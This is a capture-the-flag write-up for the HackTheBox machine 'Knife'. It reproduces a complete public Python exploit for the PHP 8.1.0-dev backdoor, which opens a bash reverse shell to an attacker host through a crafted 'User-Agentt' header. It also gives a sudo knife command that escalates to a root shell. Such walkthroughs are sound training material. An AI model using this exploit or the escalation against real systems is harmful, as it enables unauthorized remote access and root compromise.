---
title: Knife
tags:
  - HackTheBox
  - Easy
  - Linux
  - PHP
  - Sudo-Vulnerability
date: 2024-09-05T00:00:00Z
---
![](Pasted%20image%2020241105182621.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.10.242 knife.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- knife.htb > sC.txt

[redacted]
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http
|_http-title:  Emergent Medical Idea
```

So I inspected the website:

![](Pasted%20image%2020241105182921.png)

 After inspecting the source code, I decided to enumerate with [Ffuf 🐳](/notes/tools/ffuf.md):

```shell
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt:FUZZ -u http://knife.htb/FUZZ -s

.htpasswd
.htaccess
.hta
index.php
server-status
```

We can now use [cURL ⚙️](/notes/tools/cURL.md) to find out which php version is being used:

```shell
curl -I http://knife.htb/index.php

HTTP/1.1 200 OK
Date: Tue, 05 Nov 2024 17:41:23 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Content-Type: text/html; charset=UTF-8
```

## Weaponization

So now we can search for "*PHP 8.1.0-dev exploits*". I found the following [Exploit in Github](https://github.com/flast101/php-8.1.0-dev-backdoor-rce):

```python
# Exploit Title: PHP 8.1.0-dev Backdoor Remote Code Execution
# Date: 23 may 2021
# Exploit Author: flast101
# Vendor Homepage: https://www.php.net/
# Software Link: 
#     - https://hub.docker.com/r/phpdaily/php
#     - https://github.com/phpdaily/php
# Version: 8.1.0-dev
# Tested on: Ubuntu 20.04
# CVE : N/A
# References:
#     - https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a
#     - https://github.com/vulhub/vulhub/blob/master/php/8.1-backdoor/README.zh-cn.md

"""
Blog: https://flast101.github.io/php-8.1.0-dev-backdoor-rce/
Download: https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/revshell_php_8.1.0-dev.py
Contact: flast101.sec@gmail.com

An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header.
The following exploit uses the backdoor to provide a pseudo shell ont the host.

Usage:
  python3 revshell_php_8.1.0-dev.py <target-ip> <attacker-ip> <attacker-port>
"""

#!/usr/bin/env python3
import os, sys, argparse, requests

request = requests.Session()

def check_target(args):
    response = request.get(args.url)
    for header in response.headers.items():
        if "PHP/8.1.0-dev" in header[1]:
            return True
    return False

def reverse_shell(args):
    payload = 'bash -c \"bash -i >& /dev/tcp/' + args.lhost + '/' + args.lport + ' 0>&1\"'
    injection = request.get(args.url, headers={"User-Agentt": "zerodiumsystem('" + payload + "');"}, allow_redirects = False)

def main(): 
    parser = argparse.ArgumentParser(description="Get a reverse shell from PHP 8.1.0-dev backdoor. Set up a netcat listener in another shell: nc -nlvp <attacker PORT>")
    parser.add_argument("url", metavar='<target URL>', help="Target URL")
    parser.add_argument("lhost", metavar='<attacker IP>', help="Attacker listening IP",)
    parser.add_argument("lport", metavar='<attacker PORT>', help="Attacker listening port")
    args = parser.parse_args()
    if check_target(args):
        reverse_shell(args)
    else:
        print("Host is not available or vulnerable, aborting...")
        exit
    
if __name__ == "__main__":
    main()
    
```

## Exploitation

> If we execute the script, we'll get a reverse shell :D

```shell
python3 exploit.py http://knife.htb 10.10.14.24 666
```

![](Pasted%20image%2020241105185303.png)

> So now we can read user flag:

![](Pasted%20image%2020241105185426.png)

## Privilege escalation

If we run:

```shell
sudo -l

Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

So we can execute that binary with sudo permissions. I found this sudo vulnerability in [GTFOBins](https://gtfobins.github.io/gtfobins/knife/):

```shell
sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
```

> We can now read root flag :D

![](Pasted%20image%2020241105190005.png)

==Machine pwned!==